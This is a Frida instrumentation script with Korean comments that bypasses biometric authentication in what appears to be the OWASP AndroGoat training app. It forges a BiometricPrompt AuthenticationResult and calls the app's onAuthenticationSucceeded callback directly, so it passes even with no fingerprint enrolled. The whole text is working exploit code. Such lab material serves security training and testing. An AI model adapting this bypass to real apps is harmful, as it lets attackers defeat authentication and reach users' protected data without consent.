// 생체 인증 우회 (직접 호출 방식)
// 취약점: onAuthenticationSucceeded 가 CryptoObject 와 무관하게 성공 UI 를 띄운다.
// 지문이 하나도 등록돼 있지 않아도, 성공 콜백을 직접 부르면 통과된다.
Java.perform(function () {
    var AuthResult = Java.use("androidx.biometric.BiometricPrompt$AuthenticationResult");

    Java.choose("owasp.sat.agoat.BioMetricAuthActivity$onCreate$1", {
        onMatch: function (cb) {
            Java.scheduleOnMainThread(function () {
                try {
                    var result = AuthResult.$new(null, 2);
                    cb.onAuthenticationSucceeded(result);
                    console.log("[bio-bypass] 지문 미등록 상태에서 onAuthenticationSucceeded 직접 호출 → 성공");
                } catch (e) {
                    console.log("[err] " + e);
                }
            });
        },
        onComplete: function () { console.log("[*] callback 탐색 완료"); }
    });
});
